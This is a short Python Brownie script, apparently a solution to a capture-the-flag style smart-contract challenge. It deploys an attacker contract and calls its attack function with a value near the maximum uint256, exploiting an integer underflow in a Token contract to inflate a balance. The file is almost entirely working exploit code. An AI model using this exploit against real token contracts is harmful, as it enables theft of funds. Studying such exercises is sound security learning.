from brownie import Token, TokenToHack, network, config, accounts
from scripts.helpers import LOCAL_BLOCKCHAIN_ENVIRONMENTS, get_account


def hack_token_contract(eos_account, accomplice, instance_address):
    # SET max uint256
    MAX_UINT256 = (2**256-1)
    # Deploy hacking account
    hacking_contract = TokenToHack.deploy(instance_address, {"from": accomplice})
    # Check balance before attack
    balance_before = hacking_contract._balanceOf(eos_account)
    print("Balance of {}:".format(eos_account))
    print("... before attack: {}".format(balance_before))
    # Perform attack
    # NOTE: subtracted 21 (=balance_before + 1) to not overflow our account
    hacking_contract.attack(eos_account, MAX_UINT256-(balance_before + 1), {"from": accomplice})
    # Checking balance after the attack
    balance_after = hacking_contract._balanceOf(eos_account)
    print("Balance of {}:".format(eos_account))
    print("... after attack: {}".format(balance_after))


def main():
    account = get_account()
    # if local environment, the original Token contract needs to be deployed at first
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        token_contract = Token.deploy(20, {"from": account})
        instance_address = token_contract.address
        accomplice = get_account(1)
    else:
        instance_address = config["networks"][network.show_active()]["token_instance"]
        accomplice = accounts.add(config["wallets"]["from_key_acc"])

    hack_token_contract(account, accomplice, instance_address)
    
    
